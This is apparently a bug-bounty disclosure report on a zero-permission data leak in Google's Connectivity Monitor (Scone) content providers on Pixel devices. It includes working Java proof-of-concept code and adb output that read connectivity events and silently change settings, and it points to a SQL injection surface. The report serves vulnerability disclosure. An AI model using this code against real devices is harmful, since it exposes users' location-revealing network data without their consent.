# VRP Report #42: Scone NimbusProvider Zero-Permission Connectivity Data Leak

## Summary
Google Connectivity Monitor (Scone, `com.google.android.apps.scone`) exports the `NimbusProvider` content provider without any permission requirement. The `query()` method has **no permission check**, allowing any zero-permission app to read all connectivity events stored in the database — including timestamps, event types, sources, and protobuf BLOB data containing network identifiers. This enables **location fingerprinting** without any user consent or permission grants.

The inconsistency is stark: `call("significantevents")` and `insert()` both enforce Google platform signature or `READ_PRIVILEGED_PHONE_STATE` permission, but `query()` — the most dangerous operation for data exfiltration — has **no check at all**.

## Affected Components

| Component | Authority | Exported | Permission |
|-----------|-----------|----------|------------|
| NimbusProvider | `com.google.android.apps.scone.connectivitymonitor.nimbusprovider` | true | NONE |
| ConnectivityHelperProvider | `com.google.android.connectivitymonitor.connectivityhelperprovider` | true | NONE |

## Vulnerability Details

### 1. NimbusProvider — Zero-Permission Connectivity Event Data Leak (HIGH)

**Root Cause:** The `query()` method in `NimbusContentProvider.java` passes caller-supplied projection, selection, selectionArgs, and sortOrder directly to `SQLiteDatabase.query()` without any permission check. Meanwhile, `call()` checks `isGooglePlatformSigned()` or `READ_PRIVILEGED_PHONE_STATE`, and `insert()` checks the same — proving the developer intended this data to be protected.

**Data Exposed (380+ rows on test device):**
- `id` — unique event identifier
- `creation_timestamp_ms` — precise event creation time (millisecond)
- `expiration_timestamp_ms` — event expiry time
- `event_timestamp_ms` — when the connectivity event occurred
- `source` — event source identifier (1=telephony, 7=connectivity subsystem)
- `type` — event type code (1024=radio state change, 2003=data state, 4200=connectivity change)
- `subtype` — event subtype
- `connectivity_event_data` — **protobuf BLOB** containing raw connectivity data

**The BLOB data** is encoded ConnectivityMonitorProto messages that typically contain:
- Cell tower identifiers (MCC, MNC, LAC, CID)
- WiFi network identifiers (SSID, BSSID)
- Signal strength measurements
- Network type and state transitions
- IP address information

This data enables **location fingerprinting** — mapping cell tower IDs and WiFi BSSIDs to geographic locations using public databases.

### 2. ConnectivityHelperProvider — Zero-Permission Settings Read+Write (MEDIUM)

**Data Exposed AND Writable:**
- `version` — provider version
- `feature_control` — feature toggle (off/on)
- `on_device_notifications` — notification setting
- `d2d_notifications` — device-to-device notification setting

Write access allows a malicious app to silently enable/disable connectivity troubleshooting notifications.

### 3. SQL Injection Surface (NimbusProvider)

The `query()` method passes caller-controlled `selection` and `sortOrder` parameters directly to `SQLiteDatabase.query()` without `setStrict(true)`. Combined with the zero-permission access, this could allow:
- Schema enumeration via `sortOrder` injection
- Cross-table data extraction

## Proof of Concept

### Read all connectivity events (zero permissions required):
```java
// Any app — no permissions needed
Cursor cursor = getContentResolver().query(
    Uri.parse("content://com.google.android.apps.scone.connectivitymonitor.nimbusprovider/connectivityevents"),
    null, null, null, null);

while (cursor.moveToNext()) {
    long timestamp = cursor.getLong(cursor.getColumnIndex("event_timestamp_ms"));
    int source = cursor.getInt(cursor.getColumnIndex("source"));
    int type = cursor.getInt(cursor.getColumnIndex("type"));
    byte[] blob = cursor.getBlob(cursor.getColumnIndex("connectivity_event_data"));
    // blob contains protobuf-encoded network identifiers
    Log.d("LEAK", "Event: ts=" + timestamp + " src=" + source + " type=" + type + " blob_size=" + blob.length);
}
```

### Read AND modify connectivity settings (zero permissions required):
```java
// Read settings
Cursor cursor = getContentResolver().query(
    Uri.parse("content://com.google.android.connectivitymonitor.connectivityhelperprovider/settings"),
    null, null, null, null);

// Write settings — enable d2d notifications without user consent
ContentValues cv = new ContentValues();
cv.put("KEY", "d2d_notifications");
cv.put("VALUE", "on");
getContentResolver().update(
    Uri.parse("content://com.google.android.connectivitymonitor.connectivityhelperprovider/settings"),
    cv, "KEY=?", new String[]{"d2d_notifications"});
```

## Dynamic Proof (Pixel Watch 2)

### NimbusProvider — 380 rows leaked:
```
$ adb shell content query --uri "content://com.google.android.apps.scone.connectivitymonitor.nimbusprovider/connectivityevents"
Row: 0 id=1977, creation_timestamp_ms=1788983884059, event_timestamp_ms=1788983884058, source=1, type=1024, subtype=0, connectivity_event_data=BLOB
Row: 1 id=1976, creation_timestamp_ms=1788982151953, event_timestamp_ms=1788982151947, source=7, type=4200, subtype=0, connectivity_event_data=BLOB
[...378 more rows...]
```

### ConnectivityHelperProvider — settings leaked:
```
$ adb shell content query --uri "content://com.google.android.connectivitymonitor.connectivityhelperprovider/settings"
Row: 0 KEY=version, VALUE=1
Row: 1 KEY=feature_control, VALUE=off
Row: 2 KEY=on_device_notifications, VALUE=on
Row: 3 KEY=d2d_notifications, VALUE=off
```

## Impact

### Confidentiality
- **Location tracking**: Connectivity event timestamps + cell tower/WiFi data from BLOBs enable continuous location fingerprinting
- **Usage patterns**: Event frequency and timing reveals when the device is active, connects/disconnects from networks
- **Network profile**: Cell tower and WiFi data reveals home/work locations, travel patterns

### Integrity
- **ConnectivityHelperProvider**: Writable without permissions — attacker can modify notification settings and feature flags

### Attack Characteristics
- **User Interaction**: NONE (zero-click)
- **Permissions Required**: NONE (zero-permission)
- **Attack Complexity**: LOW
- **Affected Devices**: All Android devices running Google Connectivity Monitor (Scone)

### Permission Model Inconsistency
The vulnerability exists because `query()` was **not given the same permission check** as `call()` and `insert()`:
- `call("significantevents")` → checks `isGooglePlatformSigned() || READ_PRIVILEGED_PHONE_STATE`
- `insert()` → checks `isGooglePlatformSigned() || READ_PRIVILEGED_PHONE_STATE`
- `query()` → **NO CHECK** ← vulnerability

## Device / Build
- Pixel Watch 2 (3A101RTJWRGCV9), Wear OS, Build CP2A.260603.001
- Scone version as bundled
- Also affects Pixel 6a and other devices with com.google.android.apps.scone
